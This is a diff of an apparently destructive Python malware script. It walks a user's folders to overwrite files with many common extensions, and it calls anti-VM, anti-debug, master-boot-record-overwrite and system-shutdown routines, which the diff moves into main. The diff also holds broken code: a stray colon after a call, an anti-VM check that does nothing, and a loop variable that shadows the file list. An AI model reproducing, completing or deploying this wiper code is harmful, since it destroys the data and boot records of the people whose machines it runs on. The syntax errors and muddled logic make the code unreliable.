@@ -142,8 +142,8 @@ def SetFiles():
            ".gif", ".txt", ".jar", ".sql", ".bundle",
            ".sqlite3", ".html", ".php", ".log", ".bak", ".deb"] # files to seek out and overwrite
     for dirpath, dirs, files in os.walk(f"C:\\Users\\{os.getlogin()}\\{os.getcwd()}"): 
-        for file in files:
-            path = os.path.abspath(os.path.join(dirpath, file))
+        for f in files:
+            path = os.path.abspath(os.path.join(dirpath, f))
             if f.endswith(tuple(ext)): 
                 with open(f, "rb") as files:
                     data = files.read()
@@ -169,11 +169,12 @@ def main():
                     return InstallPy()
                     if not IsOnline():
                         return CommitSuicide()
+            if not AntiVm():
+                pass
+            SetFiles()
+            AntiDebug():
+            OverWriteMBR()
 if __name__ == "__main__":
     main()
-    AntiVm()
-    AntiDebug()
-    SetFiles()
-    OverWriteMBR()
     SysDown()
        
